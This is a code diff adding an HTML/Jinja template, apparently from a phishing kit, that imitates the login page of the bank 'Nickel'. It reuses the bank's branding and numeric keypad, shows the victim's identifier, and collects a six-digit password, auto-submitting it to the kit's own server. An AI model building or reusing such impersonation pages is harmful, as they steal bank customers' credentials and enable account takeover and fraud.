@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Nickel – Code</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/code.css') }}">
+</head>
+<body>
+<header class="header-nk">
+    <div class="logo-container">
+        <img src="{{ url_for('static', filename='images/nickel-logo.svg') }}" alt="Nickel" class="logo-nk">
+        <span class="brand-text">Nickel</span>
+    </div>
+    <button class="btn-partner">Espace partenaire</button>
+</header>
+<main>
+    <div class="center-nk">
+        <h1>Connexion à votre espace</h1>
+        <div class="idshow-nk">
+            <div class="icon-user-nk">
+                <span>&#128100;</span>
+            </div>
+            <span class="identifiant-nk">{{ identifiant }}</span>
+            <span class="refresh-nk">&#10227;</span>
+            <a href="#" class="change-nk">Changer</a>
+        </div>
+        <form method="POST" autocomplete="off">
+            <label class="label-nk" for="code">Mot de passe (6 chiffres) <span style="color:#ff6600;">*</span></label>
+            <div class="code-input-wrapper">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <input type="password" maxlength="6" pattern="\d{6}" inputmode="numeric" name="code" id="code" class="hidden-input" aria-label="Entrer le code de sécurité" required>
+            </div>
+            <a href="#" class="mdpoublie-nk">Mot de passe oublié ?</a>
+            <div class="numpad-nk">
+                <div class="numpad-row-nk">
+                    <button type="button" class="num-btn-nk">1</button>
+                    <button type="button" class="num-btn-nk">2</button>
+                    <button type="button" class="num-btn-nk">3</button>
+                </div>
+                <div class="numpad-row-nk">
+                    <button type="button" class="num-btn-nk">4</button>
+                    <button type="button" class="num-btn-nk">5</button>
+                    <button type="button" class="num-btn-nk">6</button>
+                </div>
+                <div class="numpad-row-nk">
+                    <button type="button" class="num-btn-nk">7</button>
+                    <button type="button" class="num-btn-nk">8</button>
+                    <button type="button" class="num-btn-nk">9</button>
+                </div>
+                <div class="numpad-row-nk">
+                    <button type="button" class="num-btn-nk">0</button>
+                    <button type="button" class="wide-btn-nk" id="clear-btn">Effacer &#9003;</button>
+                </div>
+            </div>
+        </form>
+    </div>
+</main>
+<footer class="footer-nk">
+    <a href="#" class="footer-link-nk">Aide & opposition CB</a>
+    <span>|</span>
+    <a href="#" class="footer-link-nk">Pas encore client ?</a>
+</footer>
+
+<script>
+const input = document.getElementById('code');
+const dots = document.querySelectorAll('.dot');
+const numButtons = document.querySelectorAll('.num-btn-nk');
+const clearButton = document.getElementById('clear-btn');
+
+function updateDots() {
+    const value = input.value;
+    dots.forEach((dot, index) => {
+        if (index < value.length) {
+            dot.classList.add('filled');
+        } else {
+            dot.classList.remove('filled');
+        }
+    });
+    if (value.length === 6) {
+        input.form.submit();
+    }
+}
+
+numButtons.forEach(button => {
+    button.addEventListener('click', () => {
+        if (input.value.length < 6) {
+            input.value += button.textContent;
+            updateDots();
+        }
+    });
+});
+
+clearButton.addEventListener('click', () => {
+    input.value = input.value.slice(0, -1);
+    updateDots();
+});
+
+input.addEventListener('input', updateDots);
+</script>
+</body>
+</html>
